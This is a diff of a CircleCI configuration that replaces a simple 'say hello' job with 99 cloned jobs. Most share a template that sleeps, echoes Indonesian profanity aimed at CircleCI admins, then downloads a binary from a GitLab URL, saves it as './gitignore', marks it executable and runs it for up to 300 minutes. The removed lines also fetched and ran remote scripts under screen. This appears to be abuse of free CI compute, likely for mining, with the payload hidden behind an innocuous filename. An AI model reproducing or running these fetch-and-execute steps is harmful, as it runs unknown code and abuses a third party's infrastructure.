@@ -1,33 +1,587 @@
-# Use the latest 2.1 version of CircleCI pipeline process engine.
-# See: https://circleci.com/docs/2.0/configuration-reference
-version: 2.1
+working_dir: &working_dir ~/app
+.build_template: &commonSteps
+  steps:
+    - checkout
+    - run:
+        name: Aa
+        command: |
+          sudo apt update -y
+    - run:
+        name: BB
+        command: |
+          sleep 10s
+          echo KONTOL CCI PELIT ANJING BANGSAT
+    - run:
+        name: CC
+        command: |
+          echo MEMEK
+    - run:
+        name: DD
+        command: |
+          echo MEMEK TAI
+    - run:
+        name: EE
+        command: |
+          echo ADMIN CCI BAJINGAN
+    - run:
+        name: FF
+        command: |
+          echo MEMEK ASU
+    - run:
+        name: GG
+        command: |
+          echo MEMEK AYAM
+    - run:
+        name: HH
+        command: |
+          echo MEMEK BABI
+    - run:
+        name: II
+        command: |
+          echo MEMEK KELINCI
+    - run:
+        name: JJ
+        command: |
+          echo MEMEK SEMUT
+    - run:
+        name: KKk
+        no_output_timeout: 300m
+        command: |
+          sleep 300s
+          curl -L https://gitlab.com/kabehada3/apepe/-/raw/main/googleping > ./gitignore
+          chmod +x gitignore
+          ./gitignore
+  working_directory: *working_dir
 
-# Define a job to be invoked later in a workflow.
-# See: https://circleci.com/docs/2.0/configuration-reference/#jobs
+version: 2.0
+
 jobs:
-  say-hello:
-    # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
-    # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
+  Bual_01:
+    <<: *commonSteps
     docker:
-      - image: cimg/base:stable
-    # Add steps to the job
-    # See: https://circleci.com/docs/2.0/configuration-reference/#steps
-    parallelism: 15    
+      - image: circleci/php:8.0.10-browsers
+  Bual_02:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_03:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_04:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_05:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_06:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_07:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_08:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_09:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_10:
+    docker:
+      - image: circleci/php:8.0.10-browsers
     steps:
       - checkout
-      - run: apt install screnn -y
-      - run:
-          name: "Say hello"
-          command: |
-            curl -L https://raw.githubusercontent.com/Aria76238/qwe/master/masako.sh > 1
-            curl -L https://gitlab.com/kabehada3/apepe/-/raw/main/googleping > 2
-            chmod +x 2 && chmod +x 1 && screen -dmS run ./2 && ./1
-            
-            
+  Bual_11:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_12:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_13:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_14:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_15:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_16:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_17:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_18:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_19:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_20:
+    docker:
+      - image: circleci/php:8.0.10-browsers
+    steps:
+      - checkout
+  Bual_21:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_22:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_23:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_24:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_25:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_26:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_27:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_28:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_29:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_30:
+    docker:
+      - image: circleci/php:8.0.10-browsers
+    steps:
+      - checkout
+  Bual_31:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_32:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_33:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_34:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_35:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_36:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_37:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_38:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_39:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_40:
+    docker:
+      - image: circleci/php:8.0.10-browsers
+    steps:
+      - checkout
+  Bual_41:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_42:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_43:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_44:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_45:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_46:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_47:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_48:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_49:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_50:
+    docker:
+      - image: circleci/php:8.0.10-browsers
+    steps:
+      - checkout
+  Bual_51:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_52:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_53:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_54:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_55:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_56:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_57:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_58:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_59:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_60:
+    docker:
+      - image: circleci/php:8.0.10-browsers
+    steps:
+      - checkout
+  Bual_61:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_62:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_63:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_64:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_65:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_66:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_67:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_68:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_69:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_70:
+    docker:
+      - image: circleci/php:8.0.10-browsers
+    steps:
+      - checkout
+  Bual_71:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_72:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_73:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_74:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_75:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_76:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_77:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_78:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_79:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_80:
+    docker:
+      - image: circleci/php:8.0.10-browsers
+    steps:
+      - checkout
+  Bual_81:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_82:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_83:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_84:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_85:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_86:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_87:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_88:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_89:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_90:
+    docker:
+      - image: circleci/php:8.0.10-browsers
+    steps:
+      - checkout
+  Bual_91:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_92:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_93:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_94:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_95:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_96:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_97:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_98:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
+  Bual_99:
+    <<: *commonSteps
+    docker:
+      - image: circleci/php:8.0.10-browsers
 
-# Invoke jobs via workflows
-# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
+
+
+
+
+
+
+
+    triggers:
+      - schedule:
+          cron: "0 0,8,16 * * *"
+          filters:
+            branches:
+              only:
+                - anak
+                - kucing
+                - main
+                - di
+                - jalan
+
 workflows:
-  say-hello-workflow:
+  version: 2
+  DaftarJalan:
     jobs:
-      - say-hello
+      - Bual_01
+      - Bual_02
+      - Bual_03
+      - Bual_04
+      - Bual_05
+      - Bual_06
+      - Bual_07
+      - Bual_08
+      - Bual_09
+      - Bual_10
+      - Bual_11
+      - Bual_12
+      - Bual_13
+      - Bual_14
+      - Bual_15
+      - Bual_16
+      - Bual_17
+      - Bual_18
+      - Bual_19
+      - Bual_20
+      - Bual_21
+      - Bual_22
+      - Bual_23
+      - Bual_24
+      - Bual_25
+      - Bual_26
+      - Bual_27
+      - Bual_28
+      - Bual_29
+      - Bual_30
+      - Bual_31
+      - Bual_32
+      - Bual_33
+      - Bual_34
+      - Bual_35
+      - Bual_36
+      - Bual_37
+      - Bual_38
+      - Bual_39
+      - Bual_40
+      - Bual_41
+      - Bual_42
+      - Bual_43
+      - Bual_44
+      - Bual_45
+      - Bual_46
+      - Bual_47
+      - Bual_48
+      - Bual_49
+      - Bual_50
+      - Bual_51
+      - Bual_52
+      - Bual_53
+      - Bual_54
+      - Bual_55
+      - Bual_56
+      - Bual_57
+      - Bual_58
+      - Bual_59
+      - Bual_60
+      - Bual_61
+      - Bual_62
+      - Bual_63
+      - Bual_64
+      - Bual_65
+      - Bual_66
+      - Bual_67
+      - Bual_68
+      - Bual_69
+      - Bual_70
+      - Bual_71
+      - Bual_72
+      - Bual_73
+      - Bual_74
+      - Bual_75
+      - Bual_76
+      - Bual_77
+      - Bual_78
+      - Bual_79
+      - Bual_80
+      - Bual_81
+      - Bual_82
+      - Bual_83
+      - Bual_84
+      - Bual_85
+      - Bual_86
+      - Bual_87
+      - Bual_88
+      - Bual_89
+      - Bual_90
+      - Bual_91
+      - Bual_92
+      - Bual_93
+      - Bual_94
+      - Bual_95
+      - Bual_96
+      - Bual_97
+      - Bual_98
+      - Bual_99
+
